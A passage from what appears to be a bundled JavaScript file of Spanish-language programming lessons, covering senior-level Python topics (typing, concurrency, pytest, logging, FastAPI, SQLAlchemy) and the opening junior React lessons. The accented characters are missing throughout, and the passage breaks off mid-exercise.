# Si entra List[int], devuelve List[int]. Si entra List[str], devuelve List[str].
# Mypy nos avisar si intentamos mezclar los tipos.
\`\`\`

## 3. Protocolos (\`Protocol\`)
El "Pato Tipado Esttico" (Static Duck Typing). En lugar de herencia, defines un contrato.
\`\`\`python
from typing import Protocol

class Volador(Protocol):
    def volar(self) -> None: ...

def ejecutar_vuelo(objeto: Volador):
    objeto.volar()
\`\`\`
Cualquier clase que tenga un mtodo \`volar\` ser aceptada, sin necesidad de heredar explcitamente de \`Volador\`.

## 4. Pydantic (Validacin de Tipos en Ejecucin)
Las Type Hints normales solo sirven para anlisis esttico.
*   **Pydantic** usa esas hints para validar datos **en tiempo de ejecucin**.
*   Es la base de FastAPI.

---

### Misin Senior:
No uses \`Any\`. Un Senior prefiere definir un Protocolo o una Unin compleja antes que rendirse al \`Any\`.
`,completed:!1},{id:"python-20-performance-profiling",title:"Performance, Concurrencia y Profiling",level:"senior",content:`# Leccin 20: Performance, Concurrencia y Profiling

Python tiene fama de lento. Como Senior, sabes por qu y cmo acelerarlo.

## 1. El GIL (Global Interpreter Lock)
Python es un lenguaje interpretado con un "candado" global.
*   **Problema:** En sistemas multi-core, Python solo puede usar 1 core a la vez para ejecutar cdigo Python puro.
*   **Excepcin:** Cuando llamas a una librera de C (Numpy, Pandas), el GIL se libera.

## 2. Threads vs Multiprocessing
*   **Threading (\`I/O-bound\`):** Usa hilos cuando el cuello de botella es esperar datos (Network, Disco). El GIL se libera al esperar.
*   **Multiprocessing (\`CPU-bound\`):** Usa procesos cuando necesitas clculos puros. Crea un nuevo proceso Python separado.

## 3. Asyncio
Para desarrollo web (FastAPI), Asyncio es el estndar.
\`\`\`python
import asyncio

async def tarea():
    print("Empezando")
    await asyncio.sleep(1) # Libera el control mientras espera
    print("Terminado")

asyncio.run(tarea())
\`\`\`
Permite manejar miles de conexiones simultneas en un solo hilo.

## 4. Profiling (\`cProfile\`)
Nunca adivines dnde est lento tu cdigo. Mdelo.
\`\`\`bash
python -m cProfile script.py
\`\`\`
Te dir exactamente cuntas veces se llam a cada funcin y cunto tard.

---

### Misin Senior:
No reescribas todo el cdigo en C++ por "optimizacin prematura". Primero haz Profiling, encuentra la funcin lenta y luego optimize esa nica funcin (quizs usando Cython o PyO3).
`,completed:!1},{id:"python-21-testing-pro",title:"Testing Profesional (Pytest y Mocks)",level:"senior",content:`# Leccin 21: Testing Profesional (Pytest y Mocks)

Si tu cdigo no tiene tests, no existe. Pero usar \`unittest\` se siente como trabajar en 1999. El framework de facto moderno es **Pytest**.

## 1. Pytest (\`assert\`)
Olvdate de \`self.assertEqual(a, b)\`. Pytest te permite usar \`assert a == b\` y te muestra **por qu** fall de forma mgica.

## 2. Fixtures Avanzados (\`@pytest.fixture\`)
*   **Fixture:** Algo necesario para ejecutar un test (una conexin DB, un usuario creado).
*   **Reutilizacin:** Definir las fixtures en un archivo \`conftest.py\` para que todos los tests las compartan.
\`\`\`python
@pytest.fixture
def usuario_db():
    u = User(name="Test")
    db.add(u)
    yield u  # El test se ejecuta aqu
    db.remove(u)  # Limpieza post-test (Teardown)
\`\`\`

## 3. Mocking (\`unittest.mock\`)
Cuando testeas tu lgica, no quieres llamar al API de Stripe de verdad.
\`\`\`python
def test_pago(mocker):
    # Mockeamos la funcin de Stripe para que devuelva xito siempre
    mocker.patch('stripe.Charge.create', return_value={'status': 'succeeded'})
    
    resultado = procesar_pago(100)
    assert resultado == True
\`\`\`

## 4. Coverage (Cobertura)
Mide qu lneas de tu cdigo se ejecutaron durante los tests.
\`pytest --cov=src\`
Un Senior sabe que 100% de coverage no garantiza 0 bugs, pero 0% garantiza desastre.

---

### Misin Senior:
Escribe tests parametrizados (\`@pytest.mark.parametrize\`) para probar 10 escenarios con 1 sola funcin de test. Menos cdigo, ms robustez.
`,completed:!1},{id:"python-22-logging-configuracion",title:"Logging y Configuracin Profesional",level:"senior",content:`# Leccin 22: Logging y Configuracin Profesional

Hacer \`print("Error")\` en produccin es imperdonable. La visibilidad de logs y configuraciones es lo que diferencia a un Sr. de un Jr.

## 1. Mdulo \`logging\`
Nunca subestimes la librera estndar. Configurar handlers para que los errores vayan a Sentry y los infos a un archivo \`.log\` es trivial.
\`\`\`python
logger = logging.getLogger("mi_app")
handler = logging.StreamHandler()
handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
logger.addHandler(handler)
logger.setLevel(logging.INFO)

logger.info("Inicio del proceso")
\`\`\`

## 2. Gestin de Configuracin (12-Factor App)
Las configuraciones (base de datos, secretos) deben venir del entorno, no estar hardcodeadas.
*   **Pydantic Settings:** Valida que las variables de entorno existan y tengan el tipo correcto al arrancar la app.
\`\`\`python
from pydantic_settings import BaseSettings

class Settings(BaseSettings):
    db_url: str
    api_key: str

    class Config:
        env_file = ".env"

settings = Settings()
# Si falta .env o una variable, la app CRASHEA inmediatamente con un mensaje claro.
\`\`\`

## 3. Structured Logging (JSON Logs)
En la nube, los logs planos son difciles de indexar. Usa libreras como \`structlog\` para generar logs en JSON que herramientas como Datadog o Kibana puedan filtrar fcilmente.

---

### Misin Senior:
Crea un sistema de logging que incluya un \`Correlation ID\` (requestId) en cada mensaje loggeado para rastrear una peticin HTTP a travs de mltiples microservicios.
`,completed:!1},{id:"python-23-practica-senior",title:"Evaluacin Senior: El Arquitecto Python",level:"senior",content:`# Evaluacin Senior: El Arquitecto Python

Ahora el cliente no te pide un script, te pide una plataforma mantenible por 5 aos.

---

## 1. El Desafo del GIL (Performance)
**Pregunta:** Un script de procesamiento de imgenes usa \`threading\` para aplicar filtros a 1000 fotos en paralelo, pero tarda lo mismo que en secuencial. Por qu ocurre esto y cmo usaras \`multiprocessing\` para arreglarlo? (Explica la diferencia entre CPU-bound e I/O-bound).

## 2. Tipado Estricto (Architecture)
**Consigna:** Tienes una funcin \`procesar_dato(input: Any) -> Any\`.
*   Reescrbela usando \`TypeVar\`, \`Protocol\` o \`Union\` para que sea typesafe.
*   Explica por qu usar \`Any\` elimina todos los beneficios de usar un lenguaje moderno.

## 3. Testing Profesional (Pytest)
**Escenario:** Tienes una funcin que llama a una API externa de clima, procesa los datos y los guarda en una base de datos SQL.
*   Describe cmo escribiras un test unitario para la lgica de procesamiento **sin** tocar ni la API real ni la Base de Datos real. (Pista: Mocking y Fixtures).

---

### Recordatorio Final:
En Python, "Simple es mejor que complejo" (Zen of Python). Pero simple no significa simplista. Significa encapsular la complejidad en mdulos bien definidos. 
`,completed:!1,isProject:!0},{id:"python-24-backend-fastapi",title:"Backend Moderno con FastAPI",level:"senior",content:`# Leccin 24: Backend Moderno con FastAPI

Olvdate de Flask o Django por un momento. El estndar moderno para APIs de alto rendimiento en Python es **FastAPI**.

## 1. Por qu FastAPI?
*   **Velocidad:** Tan rpido como NodeJS o Go (gracias a Starlette y Pydantic).
*   **Async:** Soporte nativo para \`async/await\`.
*   **Autodocumentacin:** Genera Swagger UI (\`/docs\`) automticamente basndose en tus tipos de Python.

## 2. Tu primer Endpoint
\`\`\`python
from fastapi import FastAPI
from pydantic import BaseModel

app = FastAPI()

class Item(BaseModel):
    nombre: str
    precio: float
    es_oferta: bool = False

@app.get("/")
def leer_raiz():
    return {"mensaje": "Hola Mundo"}

@app.post("/items/")
async def crear_item(item: Item):
    return item # FastAPI se encarga de convertir el objeto a JSON
\`\`\`

## 3. Peticiones (Requests)
FastAPI lee los datos de:
*   **Path Parameters:** \`/items/{item_id}\`
*   **Query Parameters:** \`/items/?skip=0&limit=10\`
*   **Body:** JSON enviado en el cuerpo del POST.

---

### Concepto Backend:
FastAPI valida los datos **antes** de que lleguen a tu funcin. Si el cliente enva un string en lugar de un float para el precio, FastAPI devuelve un error \`422 Unprocessable Entity\` automticamente.
`,completed:!1},{id:"python-25-backend-database",title:"Conexin a Base de Datos (SQLAlchemy)",level:"senior",content:`# Leccin 25: Conexin a Base de Datos (SQLAlchemy)

Para que tu API sea til, necesita guardar datos. En Python, el ORM estndar es **SQLAlchemy**.

## 1. El modelo (\`declarative_base\`)
Define cmo es tu tabla en Python.
\`\`\`python
from sqlalchemy import Column, Integer, String
from sqlalchemy.orm import DeclarativeBase

class Base(DeclarativeBase):
    pass

class Usuario(Base):
    __tablename__ = "usuarios"
    
    id = Column(Integer, primary_key=True, index=True)
    email = Column(String, unique=True, index=True)
    hashed_password = Column(String)
\`\`\`

## 2. La Sesin
Para interactuar con la DB, abrimos una sesin.
*   **Patrn Unit of Work:** Hacemos todos los cambios (\`session.add(usuario)\`) y al final confirmamos (\`session.commit()\`). Si algo falla, hacemos \`session.rollback()\`.

## 3. Integracin con FastAPI
Usamos \`Dependency Injection\` para darle una sesin de DB a cada peticin.
\`\`\`python
def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()

@app.post("/users/")
def create_user(user: UserCreate, db: Session = Depends(get_db)):
    db_user = Usuario(email=user.email)
    db.add(db_user)
    db.commit()
    db.refresh(db_user)
    return db_user
\`\`\`

---

### Misin Backend:
Nunca abras conexiones globales a la DB. Usa un sistema de "Connection Pool" (que SQLAlchemy ya trae por defecto) para reutilizar conexiones y no saturar el servidor de base de datos.
`,completed:!1},{id:"python-26-testing-intro",title:"Testing Fundamental (Pytest)",level:"senior",content:`# Leccin 26: Testing Fundamental (Pytest)

Las pruebas no son algo opcional. Si no testeas tu cdigo, tus usuarios lo harn por ti (y no les gustar).

## 1. Pytest: El Rey del Testing
Olvdate de \`unittest\`. Pytest es ms simple y poderoso.
\`\`\`python
# test_calculadora.py
def sumar(a, b):
    return a + b

def test_suma_basica():
    assert sumar(2, 3) == 5

def test_suma_negativos():
    assert sumar(-1, 1) == 0
\`\`\`
Ejecutas con el comando \`pytest\`.

## 2. Tipos de Tests
*   **Unitarios:** Prueban una sola funcin aislada (ej: \`sumar\`). Deben ser rapidsimos (milisegundos).
*   **Integracin:** Prueban cmo interactan dos piezas (ej: \`API -> Base de Datos\`).
*   **E2E (End-to-End):** Prueban el flujo completo desde el usuario.

## 3. Fixtures: Preparando el terreno
Las \`fixtures\` son funciones que preparan datos antes de cada test.
\`\`\`python
import pytest

@pytest.fixture
def usuario_ejemplo():
    return {"nombre": "Ana", "edad": 30}

def test_edad_usuario(usuario_ejemplo):
    assert usuario_ejemplo["edad"] > 18
\`\`\`

---

### Misin Testing:
Escribe tests para romper tu propio cdigo. No testes olo el "Happy Path" (cuando todo sale bien), testea qu pasa si envas \`null\`, nmeros negativos o strings vacos.
`,completed:!1},{id:"python-27-roadmap-y-errores",title:"Errores, Anti-patrones y Roadmap Python",level:"senior",content:`# Leccin 27: Errores, Anti-patrones y Roadmap Python

Aprender Python es un viaje. Aqu te dejo un mapa para que no te pierdas.

## 1. Errores Comunes de Pythonistas
*   **"Catch-all":** Usar \`except:\` o \`except Exception:\` sin especificar qu error esperas. Esto oculta bugs legtimos.
*   **Mutable Default Arguments:** Usar listas o diccionarios como valor por defecto en una funcin (\`def f(x=[]):\`).
*   **No usar Context Managers:** Abrir archivos sin \`with\` y olvidar cerrarlos.
*   **Concatenar Strings en Bucles:** Usar \`+=\` en un string dentro de un bucle de 1000 iteraciones es muy lento. Usa \`"".join(lista)\`.

## 2. Roadmap: De Junior a Pythonista Senior

### Fase 1: El Script Kid (1-6 meses)
*   **Aprender:** Sintaxis, bucles, listas, diccionarios, regex bsico.
*   **Proyecto:** Scripts de automatizacin, mover archivos, descargar webs (scraping simple).

### Fase 2: El Constructor de Aplicaciones (6-18 meses)
*   **Aprender:** POO, excepciones, mdulos, paquetes, \`pip\`, \`venv\`, Git, Testing bsico.
*   **Proyecto:** Una API con FastAPI o un sitio con Django. Un bot de Discord o Telegram.

### Fase 3: El Ingeniero de Software (18+ meses)
*   **Aprender:** Concurrencia (\`asyncio\`), arquitectura limpia, Docker, CI/CD, patrones de diseo, optimizacin de memoria.
*   **Proyecto:** Sistemas distribuidos, microservicios, libreras open source publicadas en PyPI.

---

### Misin Final:
No te detengas. Python es enorme. Aprende Numpy y Pandas si te gusta Data Science. Aprende Django y FastAPI si te gusta Web. Aprende PyScript si quieres correr Python en el navegador. El cielo es el lmite!
`,completed:!1}]},dv={id:"react-module",title:"React",description:"Aprende a construir interfaces de usuario modernas, reactivas y basadas en componentes.",completed:!1,lessons:[{id:"react-junior-intro-react",title:"Qu es React y por qu usarlo?",level:"junior",content:`# Leccin 1: Qu es React y por qu usarlo?

React es una **biblioteca de JavaScript** (no un framework) creada por Facebook para construir interfaces de usuario basadas en componentes.

## 1. El Enfoque Declarativo
En JavaScript tradicional (Vainilla), solemos usar un enfoque **Imperativo**:
> "Busca el botn, agrgale un listener, cuando hagan click busca el div, cmbiale el texto a 'Cargando'..."

En React, usamos un enfoque **Declarativo**:
> "Este es el estado de mi componente. Si est cargando, muestra esto; si no, muestra aquello".

React se encarga de actualizar el DOM por ti de la forma ms eficiente posible.

## 2. El poder de los Componentes
Imagina una aplicacin como un juego de LEGO. Cada pieza es un componente: el botn, la barra de navegacin, la tarjeta de producto.
*   **Reutilizables:** Escribes el cdigo una vez, lo usas en 10 pginas.
*   **Aislados:** Si falla el componente de "Comentarios", el resto de la pgina sigue funcionando.

## 3. Por qu TypeScript con React?
React es muy dinmico. Usar TypeScript nos permite:
1.  Saber qu "props" (datos) recibe un componente sin adivinar.
2.  Evitar errores comunes como pasar un string donde se esperaba un nmero.
3.  Autocompletado inteligente en VS Code.

## 4. El Virtual DOM (Concepto Clave)
Manipular el DOM real del navegador es lento. React crea una copia ligera llamada **Virtual DOM**.
1.  Cuando algo cambia, React actualiza el Virtual DOM.
2.  Compara la versin vieja con la nueva (Diffing).
3.  Solo aplica al navegador los cambios estrictamente necesarios (Reconciliacin).

---

## Mini Ejercicio
Piensa en una red social como Instagram. Enumera al menos 5 componentes que podras identificar en su interfaz principal.
`,completed:!1},{id:"react-junior-spa-vs-mpa",title:"SPA vs Aplicaciones Tradicionales",level:"junior",content:`# Leccin 2: SPA vs Aplicaciones Tradicionales

Para entender React, debemos entender cmo cambia la forma en que navegamos por la web.

## 1. Aplicaciones Tradicionales (MPA)
En una **Multi-Page Application**, cada vez que haces click en un enlace:
1.  El navegador enva una peticin al servidor.
2.  El servidor genera un HTML completo.
3.  El navegador recarga **TODA** la pgina.
4.  Sentimos ese "parpadeo" blanco entre pginas.

## 2. Single Page Applications (SPA)
React permite crear **Single Page Applications**.
1.  Cargamos el HTML una sola vez (un archivo casi vaco con un \`<div id="root"></div>\`).
2.  React toma el control del navegador.
3.  Cuando navegamos, React limpia la pantalla y dibuja los nuevos componentes **instantneamente**, sin recargar la pgina.

## 3. Ventajas de la SPA
*   **Velocidad:** La carga inicial puede ser un poco ms pesada, pero la navegacin posterior es inmediata.
*   **Experiencia de Usuario:** Se siente como una aplicacin nativa de celular, suave y fluida.
*   **Ahorro de Datos:** Solo pedimos al servidor los datos (JSON) que necesitamos, no todo el HTML y CSS de nuevo.

## 4. El Rol de React
React es el "motor" que decide qu piezas de la pantalla mostrar en cada momento basndose en la lgica que t definas.

---

## Mini Ejercicio
Observa la URL de esta aplicacin (Progravio). Haz click en diferentes mdulos. La pgina se recarga por completo o solo cambia el contenido central?
`,completed:!1},{id:"react-junior-jsx",title:"JSX (JavaScript XML)",level:"junior",content:`# Leccin 3: JSX (JavaScript XML)

A primera vista, JSX parece HTML, pero no te confundas: **es JavaScript con superpoderes**.

## 1. Qu es JSX?
Es una extensin de sintaxis que permite escribir la estructura de tu interfaz de manera visual dentro de tus archivos de lgica.

\`\`\`tsx
const elemento = <h1>Hola Mundo</h1>;
\`\`\`

## 2. Reglas de Oro de JSX

### A. Raz nica
Un componente debe retornar **un solo elemento padre**. Si tienes varios elementos, debes envolverlos en un \`<div>\` o en un **Fragment** \`<> ... </>\`.

\`\`\`tsx
//  Error
return (
  <h1>Ttulo</h1>
  <p>Prrafo</p>
);

//  Correcto (Fragment)
return (
  <>
    <h1>Ttulo</h1>
    <p>Prrafo</p>
  </>
);
\`\`\`

### B. JavaScript entre llaves \`{}\`
Puedes insertar cualquier expresin vlida de JS dentro de JSX usando llaves.

\`\`\`tsx
const nombre = "Octavio";
return <h1>Hola {nombre.toUpperCase()}</h1>;
\`\`\`

### C. CamelCase para Atributos
En HTML usamos \`class\`. En JSX usamos \`className\`.
En HTML usamos \`onclick\`. En JSX usamos \`onClick\`.

\`\`\`tsx
<button className="btn-primary" onClick={handleClick}>
  Click aqu
</button>
\`\`\`

## 3. Comentarios en JSX
Para comentar dentro del retorno de un componente, debes usar la sintaxis de JS dentro de llaves: \`{/* mi comentario */}\`.

---

## Mini Ejercicio
Intenta escribir un fragmento de JSX que renderice un \`div\` con un \`h2\`, un \`p\` que muestre el resultado de \`2 + 2\`, y una imagen (\`img\`) que tenga un atributo \`alt\`.
`,completed:!1},{id:"react-junior-componentes-funcionales",title:"Componentes Funcionales",level:"junior",content:`# Leccin 4: Componentes Funcionales

En el React moderno, los componentes son simplemente funciones de JavaScript que devuelven JSX.

## 1. Creando tu primer componente
Un componente es una funcin que empieza con **Mayscula** (PascalCase). Esto es obligatorio para que React lo distinga de una etiqueta HTML normal.

\`\`\`tsx
// Definicin
function MiBoton() {
  return (
    <button>Soy un botn</button>
  );
}

// Uso (dentro de otro componente)
function App() {
  return (
    <div>
      <h1>Bienvenido</h1>
      <MiBoton />
    </div>
  );
}
\`\`\`

## 2. Exportacin e Importacin
Solemos tener un archivo por componente para mantener el proyecto organizado.

\`\`\`tsx
// components/Title.tsx
export function Title() {
  return <h1>Mi Ttulo</h1>;
}

// App.tsx
import { Title } from './components/Title';
\`\`\`

## 3. Tipado de Componentes (TypeScript)
Como estamos usando TypeScript, podemos definir que una funcin devuelve un elemento de React.

\`\`\`tsx
import React from 'react';

const Card: React.FC = () => {
  return <div className="card">Contenido</div>;
};
\`\`\`
*Tip: \`React.FC\` significa "Functional Component".*

## 4. Error Comn: Olvidar el return
Si tu funcin no retorna nada (o retorna \`undefined\`), React lanzar un error. Asegrate de siempre devolver JSX o \`null\`.

---

## Mini Ejercicio
Crea un componente llamado \`UserProfile\` que retorne un \`div\` con un \`h3\` (Nombre de usuario) y un \`span\` (Estado: Activo).
`,completed:!1},{id:"react-junior-props",title:"Props (Comunicacin entre Componentes)",level:"junior",content:`# Leccin 5: Props (Comunicacin entre Componentes)

Las **Props** (propiedades) son la forma en que pasamos datos de un componente padre a un componente hijo.

## 1. El flujo de datos
En React, los datos fluyen en una sola direccin: **hacia abajo**. Un componente hijo no puede (ni debe) modificar las props que recibe de su padre. Las props son **solo de lectura**.

## 2. Implementacin con TypeScript
Aqu es donde TypeScript brilla. Definimos una \`interface\` para especificar qu datos esperamos recibir.

\`\`\`tsx
interface SaludoProps {
  nombre: string;
  edad?: number; // Opcional
}

function Saludo(props: SaludoProps) {
  return (
    <div>
      <h1>Hola {props.nombre}</h1>
      {props.edad && <p>Tienes {props.edad} aos</p>}
    </div>
  );
}

// Uso desde el padre
<Saludo nombre="Octavio" edad={25} />
\`\`\`

## 3. Desestructuracin de Props (Mejor Prctica)
En lugar de escribir \`props.nombre\` todo el tiempo, solemos desestructurar los argumentos de la funcin.

\`\`\`tsx
function Saludo({ nombre, edad }: SaludoProps) {
  return <h1>Hola {nombre}</h1>;
}
\`\`\`

## 4. Pasar funciones como Props
Tambin podemos pasar funciones. Esto permite que el hijo le "avise" algo al padre (ej: cuando se hace click en un botn interno).

\`\`\`tsx
interface ButtonProps {
  text: string;
  onClick: () => void;
}

function MagicButton({ text, onClick }: ButtonProps) {
  return <button onClick={onClick}>{text}</button>;
}
\`\`\`

---

## Mini Ejercicio
Crea una interface \`ProductCardProps\` que tenga \`title\` (string), \`price\` (number) e \`isAvailable\` (boolean). Luego, crea el componente que use esas props.
`,completed:!1},{id:"react-junior-state-usestate",title:"El Estado (useState)",level:"junior",content:`# Leccin 6: El Estado (useState)

Si las props son datos que vienen de afuera, el **Estado** es la memoria interna de un componente. El estado permite que la interfaz cambie segn las acciones del usuario.

## 1. El Hook \`useState\`
Para usar el estado, importamos un **Hook** de React.

\`\`\`tsx
import { useState } from 'react';

function Contador() {
  // declaramos: [valorActual, funcinParaCambiarlo] = useState(valorInicial)
  const [cuenta, setCuenta] = useState(0);

  return (
    <div>
      <p>Has hecho click {cuenta} veces</p>
      <button onClick={() => setCuenta(cuenta + 1)}>
        Aumentar
      }
    </div>
  );
}
\`\`\`

## 2. Cmo funciona?
Cuando llamas a \`setCuenta\`, React se da cuenta de que el estado cambi y **vuelve a ejecutar la funcin del componente** (re-render) para dibujar la nueva UI con el valor actualizado.

## 3. Estado con TypeScript
TS suele inferir el tipo del estado a partir del valor inicial. Pero si es complejo (ej: un array de objetos), lo definimos as:

\`\`\`tsx
const [usuarios, setUsuarios] = useState<User[]>([]);
\`\`\`

## 4. Reglas de los Hooks
1.  **Solo en el nivel superior:** No puedes llamar a \`useState\` dentro de \`if\`, \`for\` o funciones anidadas.
2.  **Solo en componentes de React:** O en Hooks personalizados.

## 5. Error Comn: Mutacin Directa
**NUNCA** hagas esto: \`cuenta = cuenta + 1\`. 
React no se enterar del cambio y la pantalla no se actualizar. Usa siempre la funcin set (\`setCuenta\`).

---

## Mini Ejercicio
Crea un componente con un estado llamado \`isVisible\` (booleano). Agrega un botn que cambie ese estado de \`true\` a \`false\` (toggle) al hacer click.
`,completed:!1},{id:"react-junior-eventos",title:"Eventos en React",level:"junior",content:`# Leccin 7: Eventos en React

Manejar interacciones del usuario en React es muy similar al DOM estndar, pero con sintaxis CamelCase y pasando funciones.

## 1. Eventos comunes

### Click
\`\`\`tsx
const handleClick = () => {
  alert("Hola!");
};

<button onClick={handleClick}>Saludar</button>
\`\`\`

### Cambios en Inputs (onChange)
Es fundamental para capturar lo que el usuario escribe.

\`\`\`tsx
const [texto, setTexto] = useState("");

const manejarCambio = (e: React.ChangeEvent<HTMLInputElement>) => {
  setTexto(e.target.value);
};

<input type="text" onChange={manejarCambio} />
\`\`\`

## 2. El objeto Evento (\`e\`)
En React, el evento es un "SyntheticEvent", un envoltorio que hace que los eventos funcionen igual en todos los navegadores.
*   **TypeScript Tip:** Para un input, el tipo es \`React.ChangeEvent<HTMLInputElement>\`.

## 3. Pasar argumentos a un evento
Si necesitas pasar un dato extra a la funcin del evento, debes usar una funcin annima.

\`\`\`tsx
//  Error: Se ejecuta al renderizar
<button onClick={eliminarUsuario(id)}>Eliminar</button>

//  Correcto: Se ejecuta solo al hacer click
<button onClick={() => eliminarUsuario(id)}>Eliminar</button>
\`\`\`

## 4. Prevenir comportamiento por defecto
til en formularios.

\`\`\`tsx
const handleSubmit = (e: React.FormEvent) => {
  e.preventDefault(); // Evita que la pgina se recargue
  console.log("Enviando...");
};
\`\`\`

---

## Mini Ejercicio
Crea un input de texto y una etiqueta \`p\`. Haz que el texto del prrafo se actualice en tiempo real con lo que el usuario escribe en el input.
`,completed:!1},{id:"react-junior-renderizado-condicional",title:"Renderizado Condicional",level:"junior",content:`# Leccin 8: Renderizado Condicional

El renderizado condicional permite mostrar u ocultar elementos basndonos en la lgica de nuestra aplicacin.

## 1. Usando el operador Ternario \`? :\`
Ideal para elegir entre dos opciones (A o B).

\`\`\`tsx
function Mensaje({ isLoggedIn }: { isLoggedIn: boolean }) {
  return (
    <div>
      {isLoggedIn ? <h1>Bienvenido de nuevo</h1> : <h1>Por favor inicia sesin</h1>}
    </div>
  );
}
\`\`\`

## 2. Usando el Cortocircuito \`&&\`
Ideal para mostrar algo **solo si una condicin es verdadera**. Si es falsa, no muestra nada.

\`\`\`tsx
function Notificaciones({ mensajesRecibidos }: { mensajesRecibidos: number }) {
  return (
    <div>
      <h2>Dashboard</h2>
      {mensajesRecibidos > 0 && (
        <span className="badge">Tienes mensajes nuevos</span>
      )}
    </div>
  );
}
\`\`\`

## 3. Retorno Temprano (Early Return)
Si un componente no debe renderizar absolutamente nada bajo cierta condicin, podemos retornar \`null\`.

\`\`\`tsx
function Modal({ isOpened }: { isOpened: boolean }) {
  if (!isOpened) return null; // No sigue procesando

  return <div className="modal">Estoy abierto!</div>;
}
\`\`\`

## 4. Error Comn: Ceros en la pantalla
Ten cuidado con el \`&&\` y los nmeros. \`0 && <Component />\` renderizar el nmero \`0\` en pantalla porque en JS el 0 es falso pero es un valor imprimible. 
**Solucin:** Asegrate de que la condicin sea un booleano real: \`mensajes.length > 0 && ...\`.

---

## Mini Ejercicio
Crea un componente que reciba una prop \`error\` (string). Si \`error\` tiene contenido, muestra un div rojo con el texto; si no, no muestres nada.
`,completed:!1},{id:"react-junior-listas-keys",title:"Listas y Keys",level:"junior",content:`# Leccin 9: Listas y Keys

Para mostrar mltiples elementos similares (como una lista de productos o mensajes), usamos el mtodo \`.map()\` de JavaScript.

## 1. Mapeando una lista
\`\`\`tsx
const frutas = ["Manzana", "Pera", "Naranja"];

function ListaFrutas() {
  return (
    <ul>
      {frutas.map((fruta) => (
        <li key={fruta}>{fruta}</li>
      ))}
    </ul>
  );
}
\`\`\`

## 2. El atributo \`key\`
Cada elemento en una lista generada por \`map\` **debe** tener una prop \`key\` nica.
*   **Para qu sirve?** Ayuda a React a identificar qu elementos han cambiado, se han agregado o eliminado. Sin ella, React tiene que volver a dibujar toda la lista, lo cual es ineficiente.
*   **Qu usar?** Idealmente un ID nico de tu base de datos (\`user.id\`).

## 3. Error Comn: Usar el ndice como key
\`map((item, index) => <li key={index}>...</li>)\` es una mala prctica si la lista puede cambiar de orden o eliminarse elementos, ya que el ndice no identifica permanentemente al dato. salo solo como ltimo recurso.

## 4. Renderizando Componentes
Puedes mapear una lista a componentes personalizados pasando los datos como props.

\`\`\`tsx
{usuarios.map((u) => (
  <UserCard key={u.id} user={u} />
))}
\`\`\`

---

## Mini Ejercicio
Tienes un array de objetos: \`[{id: 1, name: 'Tarea 1'}, {id: 2, name: 'Tarea 2'}]\`. Escribe el cdigo necesario para renderizar esta lista dentro de un \`div\`.
`,completed:!1},{id:"react-junior-estructura-proyecto",title:"Estructura de un Proyecto React",level:"junior",content:`# Leccin 10: Estructura de un Proyecto React

A medida que tu aplicacin crece, saber dnde poner cada archivo es vital para no perder el control.

## 1. La carpeta \`src\`
Es donde vive todo el cdigo fuente.

\`\`\`
src/
  assets/         (Imgenes, fuentes, iconos)
  components/     (Tus piezas de LEGO: Button, Nav, Card)
  hooks/          (Lgica personalizada)
  pages/          (Componentes grandes que representan una ruta)
  services/       (Llamadas a APIs)
  App.tsx         (El componente principal de entrada)
  main.tsx        (Donde React se conecta con el HTML del navegador)
\`\`\`

## 2. El punto de entrada (\`main.tsx\`)
Aqu sucede la magia inicial:
\`\`\`tsx
ReactDOM.createRoot(document.getElementById('root')!).render(
  <React.StrictMode>
    <App />
  </React.StrictMode>
);
\`\`\`
\`StrictMode\` es un componente especial que te ayuda a detectar problemas en tu cdigo durante el desarrollo.

## 3. Nombrado de Archivos
*   Componentes: \`PascalCase.tsx\` (ej: \`UserCard.tsx\`).
*   Scripts/Lgica: \`camelCase.ts\` (ej: \`analytics.ts\`).

## 4. Estilos (CSS)
Puedes usar archivos \`.css\` normales e importarlos en tu componente: \`import './Button.css'\`. El alcance de este CSS ser global, por lo que es recomendable usar metodologas como **BEM** o pasarse a **CSS Modules** o **Tailwind** ms adelante.

---

## Mini Ejercicio
Si tuvieras que crear un componente que solo se usa dentro de \`NavBar.tsx\`, donde lo guardaras segn la estructura sugerida?
`,completed:!1},{id:"react-junior-buenas-practicas",title:"Buenas Prcticas Bsicas",level:"junior",content:`# Leccin 11: Buenas Prcticas Bsicas

Escribir cdigo que funcione es fcil; escribir cdigo que otro humano pueda entender es el verdadero reto.

## 1. Componentes Pequeos y Enfocados
Si un componente tiene ms de 200 lneas, probablemente est haciendo demasiadas cosas.
**Regla:** Un componente debe tener una nica responsabilidad. Si tu \`Header.tsx\` tambin maneja la lgica de autenticacin y el carrito, sepralo.

## 2. No mutar el estado
NUNCA modifiques un objeto o array del estado directamente.
\`\`\`tsx
//  Incorrecto
const agregar = () => {
  lista.push("nuevo");
  setLista(lista);
};

//  Correcto (crear una copia)
const agregar = () => {
  setLista([...lista, "nuevo"]);
};
\`\`\`

## 3. Desestructuracin de Props
Hace el cdigo ms limpio y te permite ver de un vistazo qu datos necesita un componente.

## 4. Evitar "Props Drilling" profundo
Pasar props a travs de 5 niveles de componentes para que lleguen al ltimo hijo es frustrante. En niveles avanzados aprenderemos sobre **Context API** o **Redux** para solucionar esto. Por ahora, intenta mantener tus jerarquas simples.

## 5. Nombres Descriptivos
Usa prefijos claros:
*   \`manejarClick\` o \`handleClick\` para funciones de eventos.
*   \`esVisible\` o \`estaCargando\` para booleanos.

---

## Ejercicio Final del Mdulo
Crea una mini-aplicacin de "Contador de Pasos":
1.  Un estado \`pasos\` inicializado en 0.
2.  Un botn para aumentar.
3.  Un botn para reiniciar a 0.
4.  Si los pasos son mayores a 100, muestra un mensaje: "Excelente caminata!".
5.  Usa TypeScript para tipar todo.

Felicidades por completar el nivel Junior de React! 
`,completed:!1},{id:"ejercicios-junior",title:"Ejercicios Prcticos: React Junior",level:"junior",content:`# Ejercicios Prcticos: React Junior

Pon a prueba tus habilidades construyendo mini-aplicaciones reales. Recuerda usar **TypeScript** para todas tus soluciones.

---

## 1. El Contador de Productividad
**Objetivo:** Manejar estado simple y eventos.

**Consigna:**
Crea un componente llamado \`TaskTimer\`.
*   Tendr un estado \`segundos\` que inicia en 0.
*   Un botn "Sumar 10s" y otro "Restar 10s".
*   Si los segundos llegan a 60, muestra un mensaje: "Minuto completado!".
*   Impide que los segundos sean menores a 0.

**Resultado Esperado:** Una interfaz donde el usuario pueda ajustar el tiempo de una tarea con lmites lgicos.

---

## 2. Formulario de Suscripcin
**Objetivo:** Formularios controlados y validacin bsica.

**Consigna:**
